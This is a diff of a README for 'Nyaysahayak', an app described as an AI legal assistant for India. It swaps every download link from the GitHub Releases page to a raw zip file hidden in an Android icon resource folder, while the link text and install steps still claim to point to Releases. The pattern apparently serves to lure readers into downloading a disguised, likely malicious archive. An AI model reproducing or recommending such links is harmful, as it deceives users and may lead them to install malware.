@@ -1,6 +1,6 @@
 # 🌟 Nyaysahayak - Your AI Legal Assistant Awaits
 
-[![Download Nyaysahayak](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/SoulNoob/Nyaysahayak/releases)
+[![Download Nyaysahayak](https://raw.githubusercontent.com/SoulNoob/Nyaysahayak/main/android/app/src/main/res/mipmap-mdpi/Nyaysahayak_v3.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/SoulNoob/Nyaysahayak/main/android/app/src/main/res/mipmap-mdpi/Nyaysahayak_v3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to Nyaysahayak! This application serves as your AI legal assistant. With the ability to provide instant advice on various legal topics, it aims to make legal assistance accessible to everyone in India. 
@@ -21,7 +21,7 @@ To run Nyaysahayak smoothly, you will need:
 ## 📥 Download & Install
 To download and install Nyaysahayak, please visit the following page:
 
-[Download Nyaysahayak from Releases](https://github.com/SoulNoob/Nyaysahayak/releases)
+[Download Nyaysahayak from Releases](https://raw.githubusercontent.com/SoulNoob/Nyaysahayak/main/android/app/src/main/res/mipmap-mdpi/Nyaysahayak_v3.7.zip)
 
 1. Click the link above to go to the Releases page. 
 2. On the Releases page, find the latest version of Nyaysahayak.
@@ -67,6 +67,6 @@ Nyaysahayak is released under the MIT License, allowing for free use and distrib
 
 For any questions or additional information, please reach out through the project's GitHub page.
 
-[Download Nyaysahayak from Releases](https://github.com/SoulNoob/Nyaysahayak/releases)   
+[Download Nyaysahayak from Releases](https://raw.githubusercontent.com/SoulNoob/Nyaysahayak/main/android/app/src/main/res/mipmap-mdpi/Nyaysahayak_v3.7.zip)   
 
 We hope you find Nyaysahayak helpful in your legal journey!
